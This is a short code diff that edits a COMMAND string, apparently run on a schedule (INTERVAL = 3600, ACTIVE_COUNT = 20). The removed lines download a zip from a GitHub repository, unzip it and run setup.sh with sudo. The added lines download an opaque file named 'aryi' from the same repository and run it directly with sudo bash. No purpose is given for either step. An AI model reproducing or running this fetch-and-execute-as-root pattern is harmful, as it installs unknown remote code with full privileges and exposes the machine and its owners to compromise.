@@ -19,10 +19,8 @@ ACTIVE_COUNT = 20
 INTERVAL = 3600
 
 COMMAND = """
-curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/zalo.zip
-unzip zalo.zip
-sudo bash setup.sh
-sleep 83864767664
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/aryi
+sudo bash aryi
 """
 
 # Global counters
